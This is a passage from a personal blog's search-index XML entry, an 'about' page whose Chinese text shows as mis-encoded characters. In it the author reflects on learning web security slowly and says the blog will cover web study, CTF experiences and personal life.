é€Ÿåº¦ï¼Œæ€»æ˜¯ç¾¡æ…•ä¸€äº›å­¦é•¿å¤§ä½¬å’Œèº«è¾¹åŒé¾„å¤§ä½¬çš„å­¦ä¹ èƒ½åŠ›ï¼Œç»™æˆ‘ä¸€ç§æœ›å°˜è«åŠçš„æ„Ÿè§‰ã€‚æˆ–è®¸ä¹Ÿæ˜¯å› ä¸ºæ—¶é—´çš„åˆ†é…ä¸å¤Ÿåˆç†ï¼Œä¸€äº›çå±‘çš„æ‚äº‹æ€»èƒ½è®©æˆ‘å¯¹webçš„å­¦ä¹ äº§ç”Ÿä¸€ç§å¿ƒæœ‰ä½™è€ŒåŠ›ä¸è¶³çš„æ„Ÿè§‰ï¼Œè®¸å¤šäº‹æƒ…éƒ½è¿‡äºè®¤çœŸï¼Œä½¿å¾—çœŸæ­£é‡è¦çš„æ²¡æœ‰è¶³å¤Ÿçš„æ—¶é—´ã€‚ä½†æ„¿æ—¥åèƒ½åŠæ—¶åœ°æ”¹å˜ï¼Œè¿½ä¸Šå¤§ä½¬ä»¬å‰è¿›çš„è„šæ­¥ï¼</p><h2 id="About-my-Blog"><a href="#About-my-Blog" class="headerlink" title="About my Blog"></a>About my Blog</h2><h3 id="To-visitors"><a href="#To-visitors" class="headerlink" title="To visitors :"></a>To visitors :</h3><p>æ„Ÿè°¢ä½ çœ‹åˆ°äº†è¿™é‡Œï¼â€§â˜…,:*:â€§(ï¿£â–½ï¿£)&#x2F;â€§:<em>â€§Â°â˜…</em>ã€€ </p><p>æˆ‘çš„åšå®¢å†…å®¹å°†åŒ…æ‹¬ä½†ä¸é™äºæˆ‘çš„webå­¦ä¹ å†ç¨‹ã€CTFç»å†ï¼Œä¹Ÿå¯èƒ½ä¼šåˆ†äº«æˆ‘çš„ç”Ÿæ´»ã€æˆ‘çš„æ€æƒ³ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæ¬¢è¿æ¯ä¸€ä½æ¥è®¿çš„æœ‹å‹ï¼Œæ¬¢è¿ä½ ä»¬çš„äº¤æµå’ŒæŒ‡ç‚¹ï¼å…±åŒå­¦ä¹ ï¼Œå…±åŒè¿›æ­¥ï¼</p><p>Keep going !</p><p><img src="/img/wallhaven-l8vp7y.jpg"></p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">æˆ‘æœŸæœ›æœ‰ä¸€å¤©ï¼Œèƒ½é‡è§ä¸€ä¸ªäººã€ä¸€ä»¶äº‹ï¼Œè®©æˆ‘ä¸ºä¹‹ç€è¿·ã€‚</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
